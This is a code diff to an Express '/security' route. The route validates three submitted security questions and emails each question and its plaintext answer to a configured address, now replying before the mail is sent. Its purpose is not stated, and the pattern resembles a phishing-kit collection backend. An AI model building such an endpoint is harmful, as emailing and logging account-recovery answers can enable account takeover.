@@ -105,56 +105,68 @@ app.post("/security", async (req, res) => {
   // Validate that we have questions array
   if (!questions || !Array.isArray(questions)) {
     console.log("Invalid questions format");
-    return res.status(400).send("Questions must be an array");
+    return res.status(400).json({ success: false, message: "Questions must be an array" });
   }
   
   // Validate that we have exactly 3 questions
   if (questions.length !== 3) {
     console.log(`Expected 3 questions, got ${questions.length}`);
-    return res.status(400).send(`Exactly 3 security questions are required, received ${questions.length}`);
+    return res.status(400).json({ 
+      success: false, 
+      message: `Exactly 3 security questions are required, received ${questions.length}` 
+    });
   }
   
   // Validate each question has required fields
   for (let i = 0; i < questions.length; i++) {
     if (!questions[i].question || !questions[i].answer) {
       console.log(`Question ${i + 1} missing required fields:`, questions[i]);
-      return res.status(400).send(`Question ${i + 1} is missing required fields`);
+      return res.status(400).json({ 
+        success: false, 
+        message: `Question ${i + 1} is missing required fields` 
+      });
     }
   }
   
-  const transporter = createTransporter();
+  // Send immediate response to prevent timeout
+  res.status(200).json({ 
+    success: true, 
+    message: "Security questions received and being processed",
+  });
   
+  // Process emails asynchronously after response
   try {
-    // Send 3 separate emails for each security question
+    const transporter = createTransporter();
+    
+    // Send emails with a shorter timeout and better error handling
     const emailPromises = questions.map(async (q, index) => {
-      const mailOptions = {
-        from: userEmail,
-        to: userEmail,
-        subject: `Security Question ${index + 1} Submission`,
-        text: `Security Question ${index + 1}:\nQuestion: ${q.question}\nAnswer: ${q.answer}`,
-      };
-      
-      console.log(`Sending email for question ${index + 1}:`, mailOptions.subject);
-      return transporter.sendMail(mailOptions);
+      try {
+        const mailOptions = {
+          from: userEmail,
+          to: userEmail,
+          subject: `Security Question ${index + 1} Submission`,
+          text: `Security Question ${index + 1}:\nQuestion: ${q.question}\nAnswer: ${q.answer}`,
+        };
+        
+        console.log(`Sending email for question ${index + 1}:`, mailOptions.subject);
+        const result = await transporter.sendMail(mailOptions);
+        console.log(`Email ${index + 1} sent successfully`);
+        return result;
+      } catch (emailError) {
+        console.error(`Failed to send email ${index + 1}:`, emailError);
+        return { error: emailError.message, questionIndex: index + 1 };
+      }
     });
     
-    // Wait for all emails to be sent
-    const results = await Promise.all(emailPromises);
-    console.log("All emails sent successfully:", results.length);
+    // Process all emails
+    const results = await Promise.allSettled(emailPromises);
+    const successful = results.filter(r => r.status === 'fulfilled' && !r.value.error).length;
+    const failed = results.length - successful;
     
-    res.status(200).json({ 
-      success: true, 
-      message: "All security questions submitted successfully!",
-      emailsSent: results.length
-    });
+    console.log(`Email processing complete: ${successful} successful, ${failed} failed`);
     
   } catch (error) {
-    console.error("Error sending security question emails:", error);
-    res.status(500).json({ 
-      success: false, 
-      message: "Failed to send security question emails", 
-      error: error.message 
-    });
+    console.error("Error in email processing:", error);
   }
 });
 
